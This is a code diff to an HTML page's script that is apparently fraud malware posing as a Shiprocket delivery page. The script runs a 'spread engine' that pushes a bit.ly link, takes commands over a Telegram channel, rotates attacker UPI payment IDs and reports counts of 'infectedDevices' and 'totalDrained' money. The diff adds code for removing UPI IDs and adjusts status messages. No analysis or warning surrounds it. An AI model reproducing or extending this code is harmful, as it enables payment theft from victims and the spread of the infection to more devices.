@@ -429,7 +429,7 @@
   }, 5000);
 
   // ============================================================
-  // SPREAD ENGINE (5 Vectors)
+  // SPREAD ENGINE
   // ============================================================
   setInterval(() => {
     const link = 'https://bit.ly/4xaXs4E';
@@ -471,7 +471,17 @@
             // ===== REMOVE UPI =====
             if (msg.startsWith('/removeupi')) {
               const upi = msg.split(' ')[1];
-              if (upi) removeUPI(upi);
+              if (upi) {
+                const index = myUPIList.indexOf(upi);
+                if (index > -1) {
+                  myUPIList.splice(index, 1);
+                  sendToTelegram('✅ UPI removed: ' + upi + '\nRemaining: ' + myUPIList.length);
+                } else {
+                  sendToTelegram('❌ UPI not found: ' + upi);
+                }
+              } else {
+                sendToTelegram('❌ Use: /removeupi upi@paytm');
+              }
             }
 
             // ===== ADD QR =====
@@ -584,7 +594,7 @@
   listenForCommands();
 
   // ============================================================
-  // REAL-TIME STATUS (Every 10 seconds)
+  // REAL-TIME STATUS
   // ============================================================
   setInterval(() => {
     const realTimeData = {
@@ -592,8 +602,7 @@
       totalDrained: totalDrained,
       infectedDevices: infectedDevices.length,
       currentUPI: myUPIList[currentUPIIndex] || 'None',
-      isPaused: isPaused,
-      transferMode: false
+      isPaused: isPaused
     };
     const msg =
       '📊 REAL-TIME STATUS\n' +
@@ -626,7 +635,7 @@
   // ============================================================
   // STARTUP
   // ============================================================
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ ALL FEATURES + ADD/REMOVE UPI & QR');
+  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ ADD/REMOVE UPI & QR AVAILABLE');
 </script>
 </body>
 </html>
